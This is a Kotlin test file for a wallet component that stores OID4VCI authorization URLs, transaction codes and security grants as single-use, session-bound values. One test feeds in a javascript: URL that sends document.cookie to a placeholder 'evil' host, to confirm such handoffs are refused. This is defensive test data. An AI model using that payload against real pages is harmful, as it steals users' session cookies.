/*
 * Copyright 2026 Sphereon International B.V.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 */

package com.sphereon.wallet.interaction.impl

import com.sphereon.wallet.interaction.WalletInteractionSensitiveInputPurpose
import com.sphereon.wallet.interaction.WalletInteractionSessionId
import com.sphereon.wallet.interaction.WalletSecurityAssurance
import com.sphereon.wallet.interaction.WalletSecurityGrant
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertNull

class StoreBackedWalletInteractionSensitiveInputAuthorityTest {
    @Test
    fun typedAuthorizationConsumePreservesWrongKindWrongSessionAndMalformedReferences() = runTest {
        val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
        val session = WalletInteractionSessionId("session-a")
        val valid = authority.register(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
            "https://issuer.example/authorize")
        val callback = authority.register(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_CALLBACK,
            "http://127.0.0.1/callback?code=real-test-value")
        val malformed = authority.register(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
            "/relative/authorization")
        assertNull(authority.consumeAuthorizationHandoff(session, callback))
        assertNull(authority.consumeAuthorizationHandoff(WalletInteractionSessionId("session-b"), valid))
        repeat(2) {
            assertFailsWith<IllegalArgumentException> { authority.consumeAuthorizationHandoff(session, malformed) }
        }
        assertEquals("http://127.0.0.1/callback?code=real-test-value",
            authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_CALLBACK, callback))
        assertEquals("https://issuer.example/authorize", authority.consumeAuthorizationHandoff(session, valid))
        assertNull(authority.consumeAuthorizationHandoff(session, valid))
    }

    @Test
    fun valuesAreSessionAndPurposeBoundAndConsumedOnce() =
        runTest {
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
            val session = WalletInteractionSessionId("session-a")
            val otherSession = WalletInteractionSessionId("session-b")
            val ref =
                authority.register(
                    session,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE,
                    "417901",
                )

            assertNull(authority.consume(otherSession, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, ref))
            assertNull(authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_CALLBACK, ref))
            assertEquals(
                "417901",
                authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, ref),
            )
            assertNull(authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, ref))
        }

    @Test
    fun securityGrantIsTypedSessionBoundAndConsumedOnce() =
        runTest {
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
            val session = WalletInteractionSessionId("session-a")
            val grant =
                WalletSecurityGrant(
                    grantId = "grant-a",
                    assurance = WalletSecurityAssurance.USER_PRESENT,
                )
            val ref = authority.registerSecurityGrant(session, grant)

            assertNull(authority.consumeSecurityGrant(WalletInteractionSessionId("session-b"), ref))
            assertEquals(grant, authority.consumeSecurityGrant(session, ref))
            assertNull(authority.consumeSecurityGrant(session, ref))
        }

    @Test
    fun `an unopenable authorization handoff is refused and remains consumable`() =
        runTest {
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
            val session = WalletInteractionSessionId("session-a")
            val ref =
                authority.register(
                    session,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    "javascript:fetch(\"//evil/\"+document.cookie)",
                )

            val first =
                assertFailsWith<IllegalArgumentException> {
                    authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref)
                }
            assertEquals("wallet_interaction_authorization_handoff_unopenable", first.message)

            val second =
                assertFailsWith<IllegalArgumentException> {
                    authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref)
                }
            assertEquals(
                "wallet_interaction_authorization_handoff_unopenable",
                second.message,
                "a refused URL must not spend the one-shot; the holder can try again",
            )
        }

    @Test
    fun `an openable authorization handoff is still one-use`() =
        runTest {
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
            val session = WalletInteractionSessionId("session-a")
            val url = "https://issuer.example/authorize?request=abc"
            val ref =
                authority.register(
                    session,
                    WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF,
                    url,
                )

            assertEquals(url, authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref))
            assertNull(authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_AUTHORIZATION_HANDOFF, ref))
        }

    @Test
    fun blankInputsAreRejectedAndClearInvalidatesOutstandingRefs() =
        runTest {
            val authority = StoreBackedWalletInteractionSensitiveInputAuthority(InMemoryWalletInteractionPrivateSessionStore())
            val session = WalletInteractionSessionId("session-a")
            assertFailsWith<IllegalArgumentException> {
                authority.register(session, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, " ")
            }
            val ref = authority.register(session, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, "417901")

            authority.clear(session)

            assertNull(authority.consume(session, WalletInteractionSensitiveInputPurpose.OID4VCI_TRANSACTION_CODE, ref))
        }
}
